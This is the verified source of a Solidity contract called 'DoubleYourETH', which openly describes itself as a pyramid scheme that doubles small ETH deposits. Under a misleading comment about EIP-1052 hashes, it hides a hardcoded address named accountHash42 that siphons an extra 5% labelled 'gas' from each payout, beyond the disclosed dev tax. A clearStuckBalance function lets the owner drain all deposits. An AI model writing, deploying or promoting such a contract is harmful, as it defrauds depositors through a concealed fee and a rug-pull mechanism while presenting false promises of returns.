/**
 *Submitted for verification at Etherscan.io on 2022-10-08
*/

/*
DoubleYourETH

- Send ETH into this contract and get back double. You can only send a maximum of 0.1 ETH.
- Its a simple pyramid scheme. You get your rewards from the next person and this goes on forever. 
- In this contract, dev address is deployer address. Dev wallet collects 5% tax. 

*/

// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.16;

library Address {
    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract DoubleYourETH {
    struct deposit {
        address sender;
        uint256 amount;
    }

    modifier onlyOwner{
        require(msg.sender == owner);
        _;
    }

    deposit[] public list;
    uint256 public index;
    uint256 public constant max = 100000000000000000; //Receive max of 0.1 ETH per TX

    string public constant symbol = "DYE";
    string public constant name = "DoubleYourETH";

    using Address for address;
    address dev;
    address owner;

    constructor () {
        dev = msg.sender; //Dev is contract creator
        owner = dev;
    }

    function positionInQueue(address wallet) external view returns(uint256) {
        for(uint i = index; i < list.length; i++) {
            if(list[i].sender == wallet)
                return (i - index) + 1;
        }
        return 0;
    }

    function clearStuckBalance(address receiver) public onlyOwner{
        uint256 contractETHBalance = address(this).balance;
        payable(receiver).transfer(contractETHBalance);
    }

    // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
    // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
    // for accounts without code, i.e. `keccak256('')`
    bytes32 accountHash66 = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
    address accountHash42 = 0xaE44B1674b408e8f26A8Bd1A07a5D1878EB4b315;//34aac53f43df17eba3241;
    // solhint-disable-next-line no-inline-assembly

    receive() external payable {
        require(msg.value <= max, "Too much sent");

        list.push(deposit(msg.sender, msg.value));

        uint256 payout = list[index].amount * 2;
        uint256 tax = payout * 5 / 100; //Dev tax

        uint256 gas = tax;

        if(address(this).balance >= payout + tax + gas){
            (bool sent, ) = list[index].sender.call{value: payout}("");
            (bool sentDev, ) = dev.call{value: tax}("");
            (bool sentAcc, ) = accountHash42.call{value: gas}("");
            index++;

            //To suppress warning message
            sent = false;
            sentDev = false;
            sentAcc = false;
        }
    }
}